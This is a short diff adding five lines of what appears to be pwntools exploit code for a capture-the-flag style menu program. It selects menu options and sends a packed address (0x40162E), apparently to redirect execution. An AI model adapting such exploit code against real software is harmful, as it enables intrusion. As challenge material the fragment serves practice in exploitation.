@@ -1,0 +1,5 @@
+io.sendlineafter('>>', '1')
+io.sendlineafter('>>', '2')
+io.sendlineafter('>>', '3')
+io.sendlineafter(':', p64(0x40162E))
+io.sendlineafter('>>', '4')
